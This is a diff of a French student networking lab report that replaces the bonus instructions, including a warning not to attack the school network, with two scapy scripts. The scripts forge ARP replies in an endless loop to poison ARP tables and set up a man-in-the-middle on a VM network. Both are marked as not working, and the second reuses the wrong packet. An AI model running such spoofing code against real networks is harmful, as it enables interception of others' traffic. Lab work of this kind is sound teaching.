@@ -272,25 +272,80 @@ Interface : 192.168.56.1 --- 0x13
 
 ## 3. Bonus : ARP poisoning
 
-![ARP poisoning](./img/ARP_poisoning.svg)
-
-> ⚠️⚠️⚠️ Si le partage de co n'a pas fonctionné, **il est hors de question que vous fassiez ça sur le réseau de l'école. Donc partage de co ou avec des VMs.**
 
 ⭐ **Empoisonner la table ARP de l'un des membres de votre réseau**
 
-- il faut donc forcer l'injection de fausses informations dans la table ARP de quelqu'un d'autre
-- on peut le faire en envoyant des messages ARP que l'on a forgé nous-mêmes
-- avec quelques lignes de code, ou y'a déjà ce qu'il faut sur internet
-- faites vos recherches, demandez-moi si vous voulez de l'aide
-- affichez la table ARP de la victime une fois modifiée dans le compte-rendu
+Grace a un fichier python suivant :
+
+```py
+from scapy.all import *
+
+trame = Ether(type=0x0806)
+
+packet = ARP()
+packet.hwlen = 6
+packet.plen = 4
+packet.op = 2
+packet.psrc = '192.168.56.105'
+packet.pdst = '192.168.56.1'
+packet.hwsrc = '08:00:27:3b:bf:9d'
+packet.hwdst = '08:00:27:29:fc:9e'
+
+total = trame / packet
+total.show()
+
+
+
+while True:
+        sendp(total)
+
+```
+
+Pas fonctionel...
 
 ⭐ **Mettre en place un MITM**
 
-- MITM pour Man-in-the-middle
-- placez vous entre l'un des membres du réseau, et la passerelle
-- ainsi, dès que ce PC va sur internet, c'est à vous qu'il envoie tous ses messages
-- pour ça, il faut continuellement empoisonner la table ARP de la victime, et celle de la passerelle
+```py
+from scapy.all import *
 
-> Au moins tous ceux veulent faire de la sécu, il faudrait faire cette partie bonus ! Prenez-vous un peu la tête pour le réaliser, avec des VMs y'aura ptet moins de trucs dans tous les sens pour une première fois. Hésitez pas à m'appeler.
+trame = Ether(type=0x0806)
 
-![ARP sniff](./img/arp.jpg)
+packet = ARP()
+packet.hwlen = 6
+packet.plen = 4
+packet.op = 2
+packet.psrc = '192.168.56.105'
+packet.pdst = '192.168.56.1'
+packet.hwsrc = '08:00:27:3b:bf:9d'
+packet.hwdst = '08:00:27:29:fc:9e'
+
+total = trame / packet
+total.show()
+
+
+
+
+trame2 = Ether(type=0x0806)
+
+packet2 = ARP()
+packet2.hwlen = 6
+packet2.plen = 4
+packet2.op = 2
+packet2.psrc = '192.168.56.105'
+packet2.pdst = '192.168.56.106'
+packet2.hwsrc = '08:00:27:3b:bf:9d'
+packet2.hwdst = '52:54:00:12:35:02'
+
+total2 = trame / packet
+total2.show()
+
+
+
+while True:
+        sendp(total)
+        sendp(total2)
+
+```
+
+Pas fonctionel...
+
